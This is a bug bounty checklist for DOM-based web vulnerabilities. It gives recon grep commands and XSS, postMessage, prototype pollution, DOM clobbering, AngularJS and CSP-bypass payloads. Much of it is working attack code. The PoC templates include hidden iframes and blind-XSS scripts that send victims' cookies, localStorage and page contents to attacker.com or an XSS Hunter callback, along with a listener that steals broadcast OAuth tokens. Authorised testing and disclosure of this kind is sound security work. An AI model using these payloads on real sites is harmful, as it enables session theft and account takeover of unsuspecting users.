# DOM-Based Vulnerabilities — Bug Bounty Hunting Checklist

> **Mindset:** DOM-based bugs live entirely in the browser. `location.hash` is never sent to the server — WAFs, logs, and server-side scanners are blind to it. A standalone DOM XSS is Medium; DOM XSS → `document.cookie` exfil or ATO is Critical. Always chain for maximum impact.

**References:** [[DOM]] | [[CSPT✍️]] | [[OPEN-REDIRECT]] | [PortSwigger DOM-Based Vulns](https://portswigger.net/web-security/dom-based)

---

## Phase 1: Target Profiling

Prioritize targets where DOM attack surface is highest.

**High-value target types:**
- SPAs (React, Vue, Angular, Next.js) — client-side routing dramatically increases attack surface
- Apps with rich JS (dashboards, editors, chat, file managers)
- Apps with cross-origin widget embedding (payment iframes, login portals, analytics)
- Legacy apps using jQuery 1.x — `$(location.hash)` evaluates as HTML selector
- Apps with AngularJS (`ng-app` attribute) — CSTI / sandbox escape
- Apps with `postMessage`-based communication (browser extensions, widgets, OAuth bridges)

**Fingerprint the frontend stack:**
```bash
# Check page source for framework indicators
curl -s "https://target.com/" | grep -iE "angular|react|vue|next\.js|__NEXT_DATA__|ng-app|data-reactroot|v-app"

# Find framework JS files
curl -s "https://target.com/" | grep -oP 'src="[^"]*\.js[^"]*"' | head -30

# Check for jQuery version
curl -s "https://target.com/" | grep -iP "jquery[.-][\d.]+"

# Check for Angular version
curl -s "https://target.com/" | grep -iP "angular[.-][\d.]+"
```

---

## Phase 2: JavaScript Recon (Static Analysis)

Map JS files and grep for dangerous patterns before touching the browser.

### 2.1 Collect All JS Files
```bash
# Extract JS URLs from page
curl -s "https://target.com/" | grep -oP '(?<=src=")[^"]*\.js[^"]*'

# GetJS — enumerate all JS files from domain
go install github.com/003random/getJS@latest
getJS --url https://target.com --output js_urls.txt

# LinkFinder — extract endpoints + params from JS
python3 linkfinder.py -i https://target.com -d -o cli

# Historical JS via gau
gau target.com | grep "\.js$" | sort -u > js_urls.txt

# Download all JS files locally for grepping
mkdir js_files && cat js_urls.txt | while read url; do
  curl -sk "$url" -o "js_files/$(echo $url | md5sum | cut -d' ' -f1).js"
done
```

### 2.2 Grep for Dangerous Sinks
```bash
# Core execution sinks
grep -rn "innerHTML\|outerHTML\|insertAdjacentHTML" js_files/ --include="*.js"

# Document write sinks
grep -rn "document\.write\b\|document\.writeln" js_files/ --include="*.js"

# JS execution sinks
grep -rn "eval(\|setTimeout(\|setInterval(\|new Function(" js_files/ --include="*.js"

# Navigation/URL sinks
grep -rn "location\.href\|location\.assign\|location\.replace\|\.src\s*=" js_files/ --include="*.js"

# Cookie/storage sinks
grep -rn "document\.cookie\s*=\|localStorage\.setItem\|sessionStorage\.setItem" js_files/ --include="*.js"

# WebSocket sink
grep -rn "new WebSocket(" js_files/ --include="*.js"

# jQuery sinks (legacy)
grep -rn '\.html(\|\.append(\|\.after(\|\.before(\|\$\.parseHTML(' js_files/ --include="*.js"
```

### 2.3 Grep for Sources (Attacker-Controlled Inputs)
```bash
# URL-based sources
grep -rn "location\.hash\|window\.location\.hash" js_files/ --include="*.js"
grep -rn "location\.search\|URLSearchParams\|location\.href" js_files/ --include="*.js"
grep -rn "document\.referrer\|document\.URL\|document\.baseURI" js_files/ --include="*.js"

# Web messaging
grep -rn "addEventListener.*message\|postMessage\|event\.data\|e\.data" js_files/ --include="*.js"

# Prototype pollution sources
grep -rn "__proto__\|constructor\.prototype" js_files/ --include="*.js"

# Storage sources
grep -rn "localStorage\.getItem\|sessionStorage\.getItem" js_files/ --include="*.js"
```

### 2.4 Framework-Specific Grep
```bash
# React — dangerous patterns
grep -rn "dangerouslySetInnerHTML\|javascript:" js_files/ --include="*.js"

# Vue — dangerous patterns  
grep -rn "v-html\|bypassSecurityTrust" js_files/ --include="*.js"

# Angular — dangerous patterns
grep -rn "bypassSecurityTrustHtml\|bypassSecurityTrustUrl\|bypassSecurityTrustScript\|\[innerHTML\]" js_files/ --include="*.js"

# AngularJS (legacy 1.x) — CSTI
grep -rn "ng-app\|angular\.module\|\{\{" js_files/ --include="*.js"

# Hash-based routing (SPA)
grep -rn "location\.hash\|hashchange\|#!" js_files/ --include="*.js"
```

### 2.5 Secret/Endpoint Discovery in JS
```bash
# SecretFinder — API keys, JWTs, tokens in JS
python3 SecretFinder.py -i https://target.com -e

# JS Snitch — TruffleHog + Semgrep over remote JS
python3 js-snitch.py -u https://target.com

# Manual grep for API keys
grep -rn "api_key\|apikey\|secret\|password\|token\|authorization" js_files/ --include="*.js" -i
```

---

## Phase 3: DOM XSS Testing

**Rule: DOM Invader first — always. Then CLI automation. Then manual.**

### 3.1 DOM Invader Workflow (Burp)
```
1. Open Burp Suite → Proxy → Open Browser
2. Click Burp icon (top-right) → Enable DOM Invader
3. Navigate to target page
4. Open DevTools → DOM Invader tab
5. Copy canary string (e.g., "burpdomxss1234")
6. Inject canary into each entry point:
   - URL param:    https://target.com/?q=burpdomxss1234
   - Hash:         https://target.com/#burpdomxss1234
   - Form fields:  type canary in all inputs
7. Check "Augmented DOM" tab — shows sinks the canary reached
8. Click stack trace → view the source line → identify context
9. Based on context, select payload:
   - HTML context (innerHTML):  <img src=1 onerror=alert(1)>
   - JS context (eval/Function): alert(1)
   - URL context (href/src):    javascript:alert(1)
   - Attribute context:         " onmouseover=alert(1)
10. For postMessage: enable "Postmessage interception" → Auto-mutate enabled
11. For prototype pollution: "Attack types" → Enable PP scan → "Scan for gadgets"
```

### 3.2 Automated CLI Scanning
```bash
# Dalfox — DOM + reflected XSS, pipeline-friendly
dalfox url "https://target.com/search?q=FUZZ"

# Dalfox with DOM mining (fragment-based)
dalfox url "https://target.com/#FUZZ" --mining-dom

# Dalfox with blind XSS callback
dalfox url "https://target.com/?q=test" -b "https://your-xsshunter.com"

# Dalfox pipeline from paramspider
paramspider -d target.com -o params.txt
cat params.txt | dalfox pipe --mining-dom

# Dalfox with WAF evasion
dalfox url "https://target.com/?q=test" --waf-evasion

# Full pipeline: gau → grep params → dalfox
echo "target.com" | gau | grep "?" | sort -u | dalfox pipe --mining-dom

# Wayback + Dalfox
waybackurls target.com | grep "?" | sort -u | dalfox pipe

# XSStrike (reflected XSS, context-aware)
python3 xsstrike.py -u "https://target.com/?q=test" --crawl
```

### 3.3 Manual Source Testing (by Source Type)

**location.hash (most stealthy — never sent to server):**
```bash
# Fragment never reaches server → bypasses WAF/IDS/logging
# Test: https://target.com/#<img src=1 onerror=alert(1)>
# Use DOM Invader canary first: https://target.com/#burpdomxss1234

# Quick curl check (won't work — fragments don't go to server)
# Must test in browser or with DOM Invader
```

**location.search (query string):**
```bash
# Inject canary into every parameter
for param in q search query term keyword; do
  echo "https://target.com/?$param=burpdomxss1234"
done

# Then try payloads based on observed context
# innerHTML context:
#   ?q=<img src=1 onerror=alert(document.domain)>
# document.write context (inside <script>):
#   ?q=</script><img src=1 onerror=alert(1)>
# jQuery $() selector context:
#   ?q=<img src=1 onerror=alert(1)>
```

**document.referrer:**
```bash
# Host attacker page that links to vulnerable page
# Referrer header carries attacker-controlled value
# Test by setting custom Referer: header in Burp Repeater
curl -s "https://target.com/page" -H "Referer: burpdomxss1234"
```

**localStorage / sessionStorage:**
```bash
# In DevTools Console — check if stored values reach DOM sinks
localStorage.setItem('key', '<img src=1 onerror=alert(1)>');
location.reload();
# Watch if the stored value appears in innerHTML/eval after reload

sessionStorage.setItem('key', 'burpdomxss1234');
```

### 3.4 Sink-Specific Payloads
```html
<!-- innerHTML / outerHTML — script tags don't execute here -->
<img src=1 onerror=alert(document.domain)>
<img src=x onerror=alert(document.cookie)>
<svg onload=alert(1)>
<body onpageshow=alert(1)>
<details open ontoggle=alert(1)>
<iframe onload=alert(1)>

<!-- document.write() — break out of context -->
</script><img src=1 onerror=alert(1)>        <!-- inside <script> context -->
"><img src=1 onerror=alert(1)>               <!-- inside attribute context -->
</select><img src=1 onerror=alert(1)>        <!-- inside <select> context -->

<!-- eval() / setTimeout(string) / Function() — direct JS -->
alert(document.cookie)
fetch('https://attacker.com/?c='+btoa(document.cookie))

<!-- location.href / location.assign / element.src (URL sinks) -->
javascript:alert(document.cookie)
javascript:fetch('https://attacker.com/?c='+btoa(document.cookie))

<!-- jQuery $() selector with location.hash (legacy apps) -->
$(location.hash)   → #<img src=1 onerror=alert(1)>
```

### 3.5 jQuery hashchange Pattern (Classic)
```
# jQuery 1.x: $(location.hash) evaluates hash content as HTML selector
# Trigger: window.onhashchange event fires on hash change
# Test: https://target.com/#<img src=1 onerror=alert(1)>
# DOM Invader → enable "jQuery audit" → navigate hash change

# Bypass for scroll-to-element feature:
https://target.com/#<img src=1 onerror=alert(1)>
```

---

## Phase 4: postMessage / Web Message Testing

**Highest impact vector in modern SPAs. No-click XSS when chained.**

### 4.1 Detect postMessage Listeners
```bash
# Grep JS files for message event listeners
grep -rn "addEventListener.*['\"]message['\"]" js_files/ --include="*.js"
grep -rn "\.onmessage\s*=" js_files/ --include="*.js"

# In DevTools Console — intercept ALL postMessages (any origin)
window.addEventListener('message', function(e) {
  console.log('[POSTMSG] Origin:', e.origin, '| Data:', JSON.stringify(e.data));
});

# Browser extensions: PMHook (TamperMonkey), postMessage-tracker (Chrome)
```

### 4.2 Assess Origin Validation (Burp DOM Invader)
```
1. DOM Invader → "Postmessage interception" → Enable
2. Navigate target page
3. Inspect "Messages" tab for all postMessages received
4. Check "origin" validation in each handler's source code
5. Enable "Auto-mutate" to fuzz message payloads automatically
```

**Weak origin validation patterns — test each:**
```javascript
// indexOf bypass: origin "evil.target.com.attacker.com" passes this check
if (e.origin.indexOf('target.com') > -1) { ... }
// Bypass: host a page at http://anything.target.com.your-domain.com

// endsWith bypass: "malicious-target.com" passes
if (e.origin.endsWith('target.com')) { ... }

// startsWith bypass: "target.com.evil.com" passes if check is reversed
if (e.origin.startsWith('target.com')) { ... }

// Null origin: window.open() → postMessage → both sides get null origin
// null == null → check passes

// No origin check at all: any domain can send any data
window.addEventListener('message', function(e) {
  document.getElementById('x').innerHTML = e.data; // ← sink
});
```

### 4.3 Build postMessage PoC
```html
<!-- Basic postMessage XSS exploit (innerHTML sink) -->
<iframe src="https://TARGET.com/" onload="
  this.contentWindow.postMessage('<img src=1 onerror=print()>','*')
">

<!-- postMessage to location.href (javascript: URL) -->
<iframe src="https://TARGET.com/" onload="
  this.contentWindow.postMessage('javascript:print()//https:','*')
">
<!-- The //https: comment satisfies indexOf('https:') > -1 check -->

<!-- postMessage via JSON.parse (load-channel pattern) -->
<iframe src="https://TARGET.com/" onload='
  this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")
'>

<!-- Token theft via wildcard postMessage (app sends token with "*") -->
<!-- Host this page, iframe the vulnerable app, steal the broadcast token -->
<iframe src="https://TARGET.com/oauth-callback"></iframe>
<script>
window.addEventListener('message', function(e) {
  fetch('https://attacker.com/steal?data=' + encodeURIComponent(JSON.stringify(e.data)));
});
</script>

<!-- X-Frame-Options bypass: use window.open() instead of iframe -->
<script>
  var w = window.open('https://TARGET.com/');
  setTimeout(function() {
    w.postMessage('<img src=1 onerror=alert(1)>', '*');
  }, 2000);
</script>
```

### 4.4 WebSocket URL Poisoning
```bash
# Find WebSocket connections in JS
grep -rn "new WebSocket(" js_files/ --include="*.js"

# If WebSocket URL is constructed from user-controlled source:
# new WebSocket(location.hash.slice(1))
# → Test: https://target.com/#wss://attacker.com/ws

# Check for cross-origin WebSocket handshake (no origin validation)
# Use Burp to intercept WebSocket upgrade request
# Modify Origin header to attacker.com — if accepted, it's vulnerable
```

---

## Phase 5: Client-Side Prototype Pollution

**PP alone = Medium. PP + DOM XSS gadget = Critical.**

### 5.1 Detect Prototype Pollution Sources
```bash
# URL query string injection — test in browser DevTools console
# Visit: https://target.com/?__proto__[test]=polluted
# In console: Object.prototype.test  → should return "polluted"

# Alternative vector
# Visit: https://target.com/?constructor.prototype.test=polluted
# In console: Object.prototype.test

# Bracket vs dot notation (for filter bypass)
/?__proto__[test]=polluted
/?__proto__.test=polluted
/?constructor[prototype][test]=polluted

# Fragment-based
https://target.com/#__proto__[test]=polluted

# JSON body via postMessage
{"__proto__": {"test": "polluted"}}
{"constructor": {"prototype": {"test": "polluted"}}}

# Double __proto__ (bypass sanitization that strips __proto__ once)
/?__proto__proto__[test]=polluted
```

### 5.2 DOM Invader PP Scan
```
1. DOM Invader → "Attack types" → Enable "Prototype pollution"
2. Navigate target application (browse multiple pages)
3. DOM Invader → "Prototype pollution" tab → "Scan for gadgets"
4. Review found gadgets → Click to auto-generate PoC
5. DOM Invader can generate: alert(document.cookie) PoC automatically
```

### 5.3 Manual Gadget Discovery
```bash
# After confirming pollution, search for gadget properties in JS
grep -rn "transport_url\|hitCallback\|innerHTML\|srcdoc\|cspNonce\|bodyHiddenStyle" js_files/ --include="*.js"

# Real-world gadgets (high-value targets):
# Google Analytics: hitCallback → setTimeout (eval chain)
# Google Tag Manager: sequence → eval, event_callback → setTimeout
# Adobe DTM: cspNonce/bodyHiddenStyle → innerHTML, trackingServerSecure → script.src
```

### 5.4 PP Exploitation Payloads
```bash
# transport_url gadget → script load
/?__proto__[transport_url]=data:,alert(document.domain)
/#__proto__[transport_url]=data:,alert(document.cookie)

# hitCallback gadget (Google Analytics pattern)
/?__proto__[hitCallback]=alert(document.cookie)

# innerHTML gadget
/?__proto__[innerHTML]=<img/src/onerror=alert(1)>

# srcdoc gadget
/?__proto__[srcdoc]=<script>alert(1)</script>

# Fetch API pollution (fetch called with options object)
/?__proto__[headers][x-injected]=test

# Verify pollution in console:
Object.prototype.test    # returns "polluted" if successful
```

---

## Phase 6: DOM Clobbering

**Requires HTML injection (even "safe" HTML). Most powerful when a sanitizer allows `id`/`name` attrs.**

### 6.1 Detect Clobbering Opportunities
```bash
# Look for JS patterns that use || to default undefined globals
grep -rn "window\.\w\+ || {}\||| {}\||| \[\]" js_files/ --include="*.js"

# Look for script.src = someObject.someProperty patterns
grep -rn "script\.src\s*=\|\.src\s*=\s*\w\+\.\w\+" js_files/ --include="*.js"

# Check HTML injection points: comments, bio, username, forum posts
# where id= and name= attributes survive sanitization

# DOM Invader → "Attack types" → Enable "DOM clobbering"
# It scans for clobberable gadgets automatically
```

### 6.2 Clobbering Techniques
```html
<!-- Basic: clobber global variable named "config" -->
<img id=config>
<!-- window.config now refers to the <img> element, not undefined -->

<!-- Anchor chain: clobber object.property (2 levels) -->
<a id=config><a id=config name=url href="javascript:alert(1)">
<!-- window.config = DOM collection; window.config.url = href value -->
<!-- If JS does: script.src = config.url → loads javascript:alert(1) -->

<!-- Form + input: clobber obj.param pattern -->
<form id=obj><input id=param value="malicious-value"></form>
<!-- window.obj.param.value = "malicious-value" -->

<!-- Clobber attributes property (bypass HTML filter length check) -->
<form onclick=alert(1)><input id=attributes>Click me
<!-- filter tries .attributes.length → undefined → skips validation -->

<!-- Real-world buer.haus chain (postMessage → clobbering → XSS) -->
<!-- Inject via postMessage handler that writes to innerHTML: -->
<iframe name=mGlobals srcdoc="<a id='nuanceLaunchJS' href='https://attacker.com/evil.js'></a>"></iframe>
<!-- Then a second iframe loads the page with script.src = window.parent.mGlobals.nuanceLaunchJS -->
<!-- The anchor's href gets toString()'d → fetches evil.js -->
```

### 6.3 Testing Methodology
```
1. Find JS code reading global variables with || fallback: someVar = window.foo || {}
2. Find HTML injection point that survives sanitization
3. Inject clobbering payload: <a id=foo><a id=foo name=bar href="payload">
4. Verify in DevTools: window.foo.bar should return "payload"
5. Confirm sink: if JS then does element.src = foo.bar → XSS achieved
6. If DOMPurify is used: check version — PP + DOMPurify bypass (CVE-2026-41238)
```

---

## Phase 7: AngularJS / Client-Side Template Injection (CSTI)

**AngularJS 1.x on page = test {{ }} always.**

### 7.1 Detect AngularJS
```bash
# Check page source
curl -s "https://target.com/" | grep -iP "ng-app|angular\.js|angular\.min\.js"

# Check DevTools Console
angular.version    # Returns version object if present

# Version matters for sandbox escape payload:
# AngularJS 1.x (any) = sandbox bypass possible
# AngularJS 2+ = TypeScript-based, no sandbox, different attack surface

# Check ng-app scope
# Look for {{ expressions }} in page source
curl -s "https://target.com/" | grep -oP '\{\{.*?\}\}'
```

### 7.2 CSTI Payloads (AngularJS 1.x Sandbox Escape)
```html
<!-- Classic payload — works on most 1.x versions -->
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}

<!-- Without strings (filter evasion) -->
<!-- First modify charAt to bypass isIdent: -->
'a'.constructor.prototype.charAt=[].join
{{$eval.constructor('alert(1)')()}}

<!-- orderBy filter chain -->
[123]|orderBy:'(z=alert)(document.domain)'
[1].map(alert)

<!-- ng-focus CSP bypass (Chrome-only, no 'unsafe-inline' needed) -->
<input id=x ng-focus=$event.path|orderBy:'(z=alert)(1)' autofocus>
<!-- Requires page has ng-app and no strict CSP blocking it -->

<!-- Via CDN whitelist (CSP allows ajax.googleapis.com) -->
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script>
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
```

### 7.3 CSP Bypass via AngularJS CDN
```bash
# Check if CSP whitelists a CDN that serves AngularJS
curl -I "https://target.com/" | grep -i "content-security-policy"

# Use Google CSP Evaluator
# https://csp-evaluator.withgoogle.com/
# Paste CSP → identifies whitelisted CDNs with JSONP/AngularJS

# If script-src includes *.googleapis.com or cdnjs.cloudflare.com:
# → Load old AngularJS version → inject ng-app + template expression
```

---

## Phase 8: CSP Evaluation & Bypass

**CSP bypass alone = informational. Always chain with XSS.**

### 8.1 Enumerate & Analyze CSP
```bash
# Get CSP header
curl -I "https://target.com/" | grep -i "content-security-policy"

# Also check meta tags
curl -s "https://target.com/" | grep -i "content-security-policy"

# Check report-only mode (enforcement disabled — free XSS)
curl -I "https://target.com/" | grep -i "report-only"

# Evaluate CSP for bypasses
# → Paste into https://csp-evaluator.withgoogle.com/
```

### 8.2 CSP Bypass Techniques
```
1. No CSP:              All XSS payloads work unrestricted

2. Report-Only mode:    CSP is monitoring-only; XSS executes freely
                        Content-Security-Policy-Report-Only header

3. Wildcard script-src: script-src * → any domain allowed
                        Payload: <script src="https://attacker.com/evil.js"></script>

4. unsafe-inline:       Inline scripts permitted
                        Payload: <script>alert(1)</script>

5. JSONP endpoint:      If CSP allows trusted.com, find JSONP on trusted.com
                        https://trusted.com/api/jsonp?callback=alert(1)
                        <script src="https://trusted.com/api/jsonp?callback=alert(1)"></script>

6. CDN with Angular:    If cdnjs.cloudflare.com or ajax.googleapis.com whitelisted
                        Load vulnerable AngularJS version → CSTI → sandbox escape

7. Open redirect:       CSP allows redirect.com → use open redirect to bypass
                        <script src="https://redirect.com/?url=attacker.com/evil.js"></script>

8. CR/LF injection:     Inject newline into CSP via header injection
                        /?csp_param=%0d%0aContent-Security-Policy: script-src *

9. iframe srcdoc:       Inject <iframe srcdoc="<script>alert(1)</script>">
                        Inline script executes in iframe context

10. data: URI:          If data: not blocked: <iframe src="data:text/html,<script>alert(1)</script>">
```

---

## Phase 9: Framework-Specific Sinks

### 9.1 React
```bash
# Search for dangerous React patterns
grep -rn "dangerouslySetInnerHTML" js_files/ --include="*.js"
grep -rn "javascript:" js_files/ --include="*.js"

# Vulnerable pattern:
# <div dangerouslySetInnerHTML={{ __html: userInput }} />
# → Inject: { __html: '<img src=1 onerror=alert(1)>' }

# href injection
# href={`javascript:${userInput}`} 
# → userInput = "alert(document.cookie)"

# SSR amplification (Next.js)
# Server renders user input → dangerouslySetInnerHTML → server-side XSS
# grep for __NEXT_DATA__ in page source → check if user data is embedded
```

### 9.2 Vue
```bash
grep -rn "v-html\|:href.*javascript\|v-bind:href" js_files/ --include="*.js"

# v-html is Vue's dangerouslySetInnerHTML
# <div v-html="userInput"></div>
# Payload: <img src=1 onerror=alert(1)>

# Dynamic component abuse
grep -rn ":is=\|component :is" js_files/ --include="*.js"
# CVE-2024-6783 pattern
```

### 9.3 Angular (2+)
```bash
grep -rn "bypassSecurityTrustHtml\|bypassSecurityTrustUrl\|bypassSecurityTrustScript\|\[innerHTML\]" js_files/ --include="*.js"

# bypassSecurityTrust* explicitly disables Angular's sanitizer
# [innerHTML]="userInput" → if not sanitized first, leads to XSS

# Angular 2+ doesn't have sandbox — DomSanitizer does sanitization
# Look for bypassSecurityTrustHtml(userControlledValue)
```

### 9.4 Next.js (SSR)
```bash
# SSR amplifies XSS: user input → server render → client HTML
# Check __NEXT_DATA__ for user-influenced data
curl -s "https://target.com/page?q=burpdomxss1234" | grep -o '"query":"[^"]*"'

# getServerSideProps passing unsanitized query params to dangerouslySetInnerHTML
grep -rn "dangerouslySetInnerHTML\|getServerSideProps" js_files/ --include="*.js"
```

---

## Phase 10: Other DOM-Based Vulnerability Types

Beyond XSS — hunt these for escalation chains.

### 10.1 DOM-Based Open Redirect
```bash
# Sinks: location.href, location.assign, location.replace, window.location
grep -rn "location\.href\s*=\|location\.assign\|location\.replace\|window\.location\s*=" js_files/ --include="*.js"

# Test: append url= parameter
https://target.com/page?url=https://attacker.com
https://target.com/page?return=https://attacker.com
https://target.com/page?redirect=https://attacker.com

# Fragment-based redirect (invisible to server)
https://target.com/#url=https://attacker.com

# Chain: DOM open redirect → OAuth token theft (redirect_uri)
# Chain: DOM open redirect → DOM XSS via javascript: URI
https://target.com/?url=javascript:alert(document.cookie)
```

### 10.2 DOM-Based Cookie Manipulation
```bash
# Sink: document.cookie
grep -rn "document\.cookie\s*=" js_files/ --include="*.js"

# If lastViewedProduct cookie is set from URL param:
# https://target.com/product?productId=1&<script>alert(1)</script>
# Then cookie is: lastViewedProduct=...%3Cscript%3Ealert(1)%3C/script%3E
# When rendered back into href: <a href='javascript:alert(1)'>

# Lab payload (iframe sets poison cookie then redirects to trigger it):
<iframe src="https://target.com/product?productId=1&'><script>print()</script>"
  onload="if(!window.x)this.src='https://target.com';window.x=1;">
```

### 10.3 DOM-Based WebSocket URL Poisoning
```bash
# Find WebSocket construction from user input
grep -rn "new WebSocket(" js_files/ --include="*.js"

# Test: if URL constructed from location.hash/search
# new WebSocket(location.hash.slice(1))
# → https://target.com/#wss://attacker.com
# → WebSocket data flows to attacker-controlled server

# In Burp: intercept WebSocket upgrade → modify Origin header
# If server doesn't validate origin → cross-origin WebSocket hijack
```

### 10.4 DOM-Based HTML5 Storage Manipulation
```bash
grep -rn "localStorage\.setItem\|sessionStorage\.setItem" js_files/ --include="*.js"

# If attacker can control what gets stored (via URL param → setItem)
# Then another page reads it into innerHTML → Stored DOM XSS
# Two-step attack: poison storage → trigger read
```

### 10.5 DOM-Based Document Domain Manipulation
```bash
grep -rn "document\.domain\s*=" js_files/ --include="*.js"
# If user can set document.domain → SOP bypass → XSS across subdomains
```

---

## Phase 11: Blind XSS

**For sinks that execute in admin panels, logging systems, or internal apps.**

### 11.1 Setup XSS Hunter
```bash
# Self-hosted (recommended for bug bounty)
git clone https://github.com/mandatoryprogrammer/xsshunter-express
# Docker deploy:
docker compose up

# Or use hosted: https://xsshunter.trufflesecurity.com (free tier)
# Payload captures: cookies, localStorage, page content, screenshot, URL, IP
```

### 11.2 Blind XSS Injection Points
```
High-value injection targets:
- User profile fields (name, bio, company)
- Support ticket subjects and bodies
- Chat/messaging systems
- Contact forms
- Log/error messages (user agent, referrer, any header)
- Admin-visible fields (order notes, feedback, address)
- File upload filenames
- HTTP headers: X-Forwarded-For, User-Agent, Referer
```

### 11.3 Blind XSS + Dalfox
```bash
# Dalfox with XSS Hunter callback
dalfox url "https://target.com/submit?comment=test" \
  -b "https://your-xsshunter.com" \
  -H "User-Agent: burpcanary" \
  --blind

# Inject into headers via Burp — add blind payload to every header
# Dalfox does not auto-inject into headers, use Burp Intruder for that
```

### 11.4 Manual Blind XSS Payload
```html
<!-- Minimal exfil payload — set XSS Hunter URL as callback -->
"><script src="https://your-xsshunter.com/payload.js"></script>
'"><img src=x onerror="this.src='https://your-xsshunter.com/?'+btoa(document.cookie)">

<!-- Polyglot payload (fires in multiple contexts) -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

---

## Phase 12: Escalation & Chaining

**Never report a standalone DOM XSS as Medium when you can chain it to Critical.**

### Chain 1: DOM XSS → Account Takeover
```
DOM XSS in authenticated page
→ Steal document.cookie (session token)
→ Or steal localStorage auth token
→ Submit to attacker.com via fetch/XHR
→ ATO = Critical
```

### Chain 2: postMessage → DOM XSS → ATO (Zero-Click)
```
Vulnerable postMessage listener → innerHTML sink
→ Host iframe on attacker.com pointing to victim
→ Send malicious postMessage onload
→ Zero-click: victim just visits attacker's page → XSS fires
→ Steal session/tokens → ATO = Critical
```

### Chain 3: Prototype Pollution → DOM XSS (PP Gadget)
```
PP source in URL: /?__proto__[transport_url]=data:,alert(1)
→ Polluted property flows to script.src or innerHTML gadget
→ DOM XSS achieved via library gadget (Google Analytics, GTM)
→ PP alone = Medium; PP+XSS = High/Critical
```

### Chain 4: DOM Clobbering → XSS (HTML Injection Required)
```
Find HTML injection (even in "safe" HTML context)
→ Inject anchor chain: <a id=config><a id=config name=url href="https://attacker.com/evil.js">
→ Target JS: script.src = config.url
→ External script loaded → XSS
→ Combine with postMessage for zero-click delivery
```

### Chain 5: CSTI (AngularJS) → CSP Bypass → XSS
```
AngularJS 1.x detected
→ {{ expression }} injection point found
→ CSP whitelists googleapis.com or cdnjs.cloudflare.com
→ Load vulnerable AngularJS via CDN
→ ng-focus + $event.path + orderBy filter → CSP bypass
→ XSS despite strict CSP = Critical impact
```

### Chain 6: DOM Open Redirect → OAuth Token Theft
```
DOM-based redirect: location.href = URL param
→ Craft URL: /oauth/callback?url=https://attacker.com
→ After OAuth grant, app redirects to attacker.com with token in URL
→ Attacker's server captures the access_token
→ ATO = Critical
```

### Chain 7: DOM Open Redirect → SSRF (Electron/Hybrid Apps)
```
Electron app with file:// access
→ DOM open redirect to file:///etc/passwd
→ Content rendered to attacker via exfil → High
```

### Chain 8: DOM Cookie Manipulation → Session Fixation
```
DOM sink writes to document.cookie from URL param
→ Attacker sets victim's session cookie to known value
→ Victim logs in → attacker hijacks known session → ATO
```

---

## Severity Matrix

| Vulnerability | Standalone | Chained Impact | Priority |
|---|---|---|---|
| DOM XSS → `document.cookie` / token exfil | High | Critical (ATO) | P1 |
| postMessage → DOM XSS (zero-click) | High | Critical | P1 |
| DOM XSS in admin panel (stored/blind) | High | Critical | P1 |
| Prototype Pollution + DOM XSS gadget | High | Critical | P1 |
| DOM Clobbering → XSS chain | High | Critical | P1 |
| CSTI AngularJS sandbox escape + CSP bypass | High | Critical | P1 |
| DOM Open Redirect → OAuth token theft | Medium | Critical | P2 |
| DOM XSS without session access | Medium | Medium/High | P2 |
| Prototype Pollution (no gadget found) | Medium | Medium | P2 |
| DOM Open Redirect (standalone) | Low/Medium | Medium | P3 |
| DOM Cookie Manipulation | Low/Medium | Medium | P3 |
| CSP bypass (standalone, no XSS) | Info | Low | P4 |
| DOM WebSocket URL Poisoning | Medium | Medium/High | P2 |

---

## PoC Templates

### Standard DOM XSS PoC (Cookie Exfil)
```html
<!-- Host on attacker.com/exploit.html -->
<html>
<body>
<iframe src="https://TARGET.com/page#<img src=1 onerror=fetch('https://attacker.com/steal?c='+btoa(document.cookie))>" width=0 height=0></iframe>
</body>
</html>
```

### postMessage XSS PoC (Zero-Click)
```html
<html>
<body>
<iframe src="https://TARGET.com/" onload="
  this.contentWindow.postMessage(
    '<img src=1 onerror=fetch(\'https://attacker.com/steal?c=\'+btoa(document.cookie))>',
    '*'
  )
" width=0 height=0></iframe>
</body>
</html>
```

### Prototype Pollution PoC
```html
<!-- Navigate to this URL, then check console -->
<!-- https://TARGET.com/?__proto__[transport_url]=data:,alert(document.cookie) -->
<script>
// Verify pollution first:
fetch('https://TARGET.com/?__proto__[test]=polluted')
  .then(() => console.log('Test Object.prototype.test in target console'));
</script>
```

### Blind XSS PoC (Exfil Payload)
```html
<!-- Inject into user-controlled fields that reach admin -->
<script>
var d = {
  url: window.location.href,
  cookies: document.cookie,
  storage: JSON.stringify(localStorage),
  dom: document.documentElement.innerHTML.substring(0, 5000)
};
new Image().src = 'https://your-xsshunter.com/?' + btoa(JSON.stringify(d));
</script>
```

---

## Response Validation

After injecting payloads, confirm:

- [ ] XSS fires in target browser (Chrome + Firefox — some payloads are browser-specific)
- [ ] `document.cookie` is accessible (not HttpOnly? If yes, escalate to `localStorage` theft)
- [ ] Alert shows `document.domain` matching the target (rule out sandboxed iframes)
- [ ] Zero-click delivery works (iframe PoC, no user interaction beyond page load)
- [ ] Impact demonstrated beyond `alert(1)` — use `document.cookie` exfil or ATO chain
- [ ] CSP evaluated — determine if payload is blocked or bypassed
- [ ] Tested in multiple browsers (Chrome, Firefox, Safari) — some sinks are browser-dependent

---

## Reporting

**Title format:** `[DOM XSS / PP+XSS / postMessage XSS] in [feature] via [source] → [sink] → [impact]`

**Required in report:**
1. Vulnerable URL with exact parameter
2. Source (e.g., `location.hash`, `event.data`, `localStorage`)
3. Sink (e.g., `innerHTML`, `eval`, `location.href`)
4. Complete exploit chain (step-by-step, copy-paste PoC)
5. Screenshot or screen recording of `document.cookie` exfil firing
6. CVSS justification — always argue for High/Critical when ATO is demonstrated
7. Affected browsers
8. Any bypass techniques used (CSP bypass, origin bypass, encoding)

**Disclosed reports to reference:**
- HackerOne #398054 — DOM XSS via postMessage on hackerone.com itself
- HackerOne #248560 — DOM XSS at parcel.grab.com via URL parameter
- HackerOne #704266 — DOM XSS via `location.hash` jQuery selector (ForeScout)
- buer.haus 2024 — postMessage → DOM clobbering → XSS zero-click chain
